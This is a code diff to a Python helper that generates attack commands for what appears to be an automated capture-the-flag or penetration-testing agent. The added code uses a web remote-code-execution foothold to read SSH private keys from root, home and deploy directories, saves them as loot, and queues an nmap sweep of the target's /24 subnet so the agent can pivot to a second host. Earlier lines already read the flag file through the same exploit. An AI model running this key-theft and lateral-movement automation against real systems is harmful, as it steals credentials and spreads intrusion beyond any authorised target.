@@ -110,4 +110,20 @@ def closer_commands(history: str, target: str) -> list[str]:
                     f"--flag /root/flag.txt")
         cmds.append(f"web-rce --url {u} --param {p} --method {meth} --mode {mode} "
                     f"--cmd 'cat /root/flag.txt'")
+        # PIVOT enabling: if we have a web foothold but no key yet, exfiltrate likely deploy/SSH keys
+        # through it (the extractor auto-persists them to /tmp/loot/id_rsa) and scan the /24 for the
+        # other host — so a second closer pass can ssh-loot. Makes the T6-style pivot deterministic.
+        if "begin openssh private key" not in low and "/tmp/loot/id_rsa" not in low:
+            for kp in ("/opt/deploy/id_rsa", "/root/.ssh/id_rsa", "/home/*/.ssh/id_rsa",
+                       "/opt/*/id_rsa", "/var/lib/*/.ssh/id_rsa"):
+                cmds.append(f"web-rce --url {u} --param {p} --method {meth} --mode {mode} "
+                            f"--cmd 'cat {kp} 2>/dev/null; cat /opt/deploy/README 2>/dev/null'")
+            sub = _subnet24(target)
+            if sub:
+                cmds.append(f"nmap -sn {sub}")
     return cmds
+
+
+def _subnet24(target: str) -> str | None:
+    m = re.match(r"^(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}$", target or "")
+    return f"{m.group(1)}.0/24" if m else None
